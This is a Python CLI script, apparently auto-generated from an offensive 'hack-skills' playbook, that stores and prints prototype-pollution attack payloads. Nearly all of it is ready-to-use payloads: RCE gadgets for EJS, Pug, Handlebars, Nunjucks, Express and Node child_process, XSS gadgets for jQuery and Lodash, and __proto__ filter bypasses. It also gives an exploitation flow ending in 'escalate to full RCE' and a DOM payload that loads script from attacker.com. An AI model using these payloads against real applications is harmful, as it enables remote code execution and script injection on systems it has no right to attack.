#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/prototype-pollution-advanced

Skill: SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation
Desc : >-

Run:  python hack-skills-prototype-pollution-advanced.py --help
      python hack-skills-prototype-pollution-advanced.py --list
      python hack-skills-prototype-pollution-advanced.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/prototype-pollution-advanced'
TITLE = 'SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: prototype-pollution-advanced", "description: >-", "Advanced prototype pollution playbook \u2014 server-side RCE, client-side gadgets, filter bypasses, and detection techniques. Companion to ../prototype-pollution/ for basics. Use when you've confirmed pollution and need to escalate to code execution or find framework-specific gadgets."],
    'skill-prototype-pollution-advanced-rce-gadget-exploitation': [],
    '0-related-routing': ["- [prototype-pollution](../prototype-pollution/SKILL.md) \u2014 **LOAD FIRST** for PP fundamentals, merge-sink detection, basic probes", "- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) \u2014 template engine RCE context (PP often triggers through template gadgets)", "- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) \u2014 client-side PP gadgets ultimately achieve XSS"],
    'advanced-reference': ["Load [KNOWN_GADGETS.md](./KNOWN_GADGETS.md) for the comprehensive gadget table by framework/library with polluted properties, trigger conditions, impact, and affected versions."],
    '1-server-side-pp-rce': [],
    '1-1-node-js-child-process-spawn-shell-env-injection': ["When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:", "```javascript", "// Vulnerable pattern (very common):", "const { execSync } = require('child_process');", "execSync('ls');  // inherits shell, env from prototype", "// Pollution for RCE:", "Object.prototype.shell = '/proc/self/exe';", "Object.prototype.argv0 = 'console.log(require(\"child_process\").execSync(\"id\").toString())//';", "Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';", "// Next child_process call executes attacker code", "Alternative ENV pollution:", "```json", "{\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--require /proc/self/cmdline\"}}"],
    '1-2-ejs-embedded-javascript-templates': ["EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:", "```json", "// Pollution payload:", "{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require('child_process').execSync('id');s\"}}", "// When EJS renders ANY template after pollution:", "// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = \"\";", "// \u2192 RCE", "Detection: any EJS `res.render()` call after pollution triggers it."],
    '1-3-pug-formerly-jade': ["Pug's compiler reads `block` from object properties:", "```json", "{\"__proto__\": {\"block\": {\"type\": \"Text\", \"val\": \"x]);process.mainModule.require('child_process').execSync('id');//\"}}}", "Alternative via `self` option:", "```json", "{\"__proto__\": {\"self\": true, \"line\": \"x]});process.mainModule.require('child_process').execSync('id');//\"}}"],
    '1-4-handlebars': ["Handlebars template compilation checks `type` and `program` on template AST nodes:", "```json", "{\"__proto__\": {\"type\": \"Program\", \"body\": [{\"type\": \"MustacheStatement\", \"path\": {\"type\": \"PathExpression\", \"original\": \"constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()\",\"parts\": [\"constructor\",\"constructor\"]}, \"params\": [], \"hash\": null}]}}", "Simpler via `allowProtoMethodsByDefault`:", "```json", "{\"__proto__\": {\"allowProtoMethodsByDefault\": true, \"allowProtoPropertiesByDefault\": true}}", "// Then use {{#with this as |obj|}}{{obj.constructor.constructor \"return process.mainModule.require('child_process').execSync('id')\"}}{{/with}}"],
    '1-5-nunjucks': ["```json", "{\"__proto__\": {\"type\": \"Code\", \"value\": \"global.process.mainModule.require('child_process').execSync('id')\"}}"],
    '1-6-express-res-render-generic': ["When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:", "```json", "{\"__proto__\": {\"view options\": {\"outputFunctionName\": \"x;process.mainModule.require('child_process').execSync('id');s\"}}}"],
    '2-client-side-prototype-pollution': [],
    '2-1-jquery-gadgets': ["`$.extend(true, {}, userInput)` performs deep merge \u2014 classic PP sink.", "After pollution, jQuery's HTML methods use polluted properties:", "```javascript", "// Pollution:", "Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';", "// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype", "$('<div>').appendTo('body');  // may use polluted property"],
    '2-2-lodash-gadgets': ["```javascript", "// Vulnerable functions (deep merge):", "_.merge({}, userInput)", "_.defaultsDeep({}, userInput)", "_.set(obj, path, value)  // if path is attacker-controlled", "// template() gadget:", "Object.prototype.sourceURL = '\\u000ajavascript:alert(1)//';", "_.template('hello')();  // sourceURL injected into Function constructor"],
    '2-3-script-gadgets-in-frameworks': ["\"Script gadgets\" are framework code paths that read from `Object.prototype` and perform dangerous operations:"],
    '2-4-dom-property-pollution': ["```javascript", "Object.prototype.src = 'https://attacker.com/evil.js';", "Object.prototype.href = 'javascript:alert(1)';", "Object.prototype.action = 'https://attacker.com/phish';", "// Any dynamically created element may inherit these"],
    '3-detection-techniques': [],
    '3-1-black-box-server-side-detection': ["Step 1: Inject and check", "POST /api/endpoint", "{\"__proto__\":{\"polluted\":\"yes\"}}", "Then: GET /api/anything", "Check if response contains \"polluted\" or behavior changes", "Step 2: Error-based detection", "{\"__proto__\":{\"toString\":1}}", "\u2192 If server crashes or returns 500, toString was overwritten", "{\"__proto__\":{\"valueOf\":1}}", "\u2192 Same crash-based detection", "Step 3: Response differential", "{\"__proto__\":{\"status\":555}}", "\u2192 Check if HTTP status code changes to 555", "{\"__proto__\":{\"content-type\":\"text/plain\"}}", "\u2192 Check if Content-Type header changes"],
    '3-2-black-box-client-side-detection': ["```javascript", "// In browser console after interacting with the app:", "Object.prototype.testPollution", "// If returns a value \u2192 something polluted the prototype", "// Automated: override defineProperty to detect writes", "Object.defineProperty(Object.prototype, '__proto__', {", "set: function(v) { console.trace('PP detected!', v); }"],
    '3-3-automated-tools': [],
    '4-bypass-proto-filters': [],
    '4-1-constructor-prototype-path': ["```json", "// Instead of:", "{\"__proto__\": {\"polluted\": \"yes\"}}", "// Use:", "{\"constructor\": {\"prototype\": {\"polluted\": \"yes\"}}}"],
    '4-2-bracket-notation-variants': ["?constructor[prototype][polluted]=yes", "?__proto__[polluted]=yes", "?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)"],
    '4-3-json-key-variations': ["```json", "{\"__proto__\": {\"a\": 1}}", "{\"constructor\": {\"prototype\": {\"a\": 1}}}", "{\"__proto__\\u0000\": {\"a\": 1}}"],
    '4-4-key-distinction-shallow-vs-deep': ["`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth."],
    '5-exploitation-flow': ["1. Find merge sink (../prototype-pollution/SKILL.md Section 0)", "\u2514\u2500\u2500 JSON body parsed and deep-merged into server object", "2. Confirm pollution:", "\u2514\u2500\u2500 {\"__proto__\":{\"testxyz\":\"1\"}} \u2192 check if testxyz appears globally", "3. Identify technology stack:", "\u251c\u2500\u2500 Express + EJS \u2192 outputFunctionName gadget (Section 1.2)", "\u251c\u2500\u2500 Express + Pug \u2192 block gadget (Section 1.3)", "\u251c\u2500\u2500 Express + Handlebars \u2192 type/program gadget (Section 1.4)", "\u251c\u2500\u2500 Any Node.js with child_process \u2192 shell/NODE_OPTIONS (Section 1.1)", "\u251c\u2500\u2500 Client-side jQuery \u2192 DOM gadgets (Section 2.1)", "\u251c\u2500\u2500 Client-side Lodash \u2192 template/sourceURL (Section 2.2)", "\u2514\u2500\u2500 Unknown \u2192 try KNOWN_GADGETS.md systematically", "4. Craft RCE/XSS payload matching gadget", "5. Verify with safe payload first (sleep / DNS callback)", "6. Escalate to full RCE"],
    '6-decision-tree': ["Confirmed prototype pollution?", "\u251c\u2500\u2500 Server-side or client-side?", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 SERVER-SIDE", "\u2502   \u2502   \u251c\u2500\u2500 Template engine in use?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 EJS \u2192 __proto__.outputFunctionName (Section 1.2)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Pug \u2192 __proto__.block (Section 1.3)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Handlebars \u2192 __proto__.type (Section 1.4)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Nunjucks \u2192 __proto__.type (Section 1.5)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Unknown \u2192 try each gadget from KNOWN_GADGETS.md", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u251c\u2500\u2500 child_process used anywhere?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 YES \u2192 __proto__.shell + NODE_OPTIONS (Section 1.1)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 MAYBE \u2192 inject and trigger error to reveal stack", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u2514\u2500\u2500 No known gadget?", "\u2502   \u2502       \u251c\u2500\u2500 Try status code pollution: __proto__.status = 555", "\u2502   \u2502       \u251c\u2500\u2500 Try header pollution: __proto__.content-type", "\u2502   \u2502       \u2514\u2500\u2500 Check KNOWN_GADGETS.md for framework match", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 CLIENT-SIDE", "\u2502       \u251c\u2500\u2500 jQuery loaded?", "\u2502       \u2502   \u251c\u2500\u2500 YES \u2192 $.extend deep merge + DOM gadgets (Section 2.1)", "\u2502       \u2502   \u2514\u2500\u2500 Check ppmap for automated gadget detection", "\u2502       \u2502", "\u2502       \u251c\u2500\u2500 Lodash loaded?", "\u2502       \u2502   \u251c\u2500\u2500 YES \u2192 _.template sourceURL gadget (Section 2.2)", "\u2502       \u2502   \u2514\u2500\u2500 _.merge as both sink AND gadget", "\u2502       \u2502", "\u2502       \u2514\u2500\u2500 Framework (Angular/Vue/Ember)?", "\u2502           \u2514\u2500\u2500 Script gadget lookup (Section 2.3)", "\u251c\u2500\u2500 __proto__ keyword filtered?", "\u2502   \u251c\u2500\u2500 Try constructor.prototype (Section 4.1)", "\u2502   \u251c\u2500\u2500 Try bracket notation (Section 4.2)", "\u2502   \u2514\u2500\u2500 Try JSON key variations (Section 4.3)", "\u2514\u2500\u2500 Not confirmed yet?", "\u2514\u2500\u2500 Go back to ../prototype-pollution/SKILL.md for detection"],
    '7-quick-reference-key-payloads': ["```json", "// EJS RCE", "{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');s\"}}", "// Pug RCE", "{\"__proto__\":{\"block\":{\"type\":\"Text\",\"val\":\"x]);process.mainModule.require('child_process').execSync('id');//\"}}}", "// child_process RCE (Node.js)", "{\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}", "// Lodash template XSS", "{\"__proto__\":{\"sourceURL\":\"\\u000ajavascript:alert(1)//\"}}", "// Filter bypass (constructor path)", "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');s\"}}}", "// Safe detection probe", "{\"__proto__\":{\"pptest123\":\"polluted\"}}"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()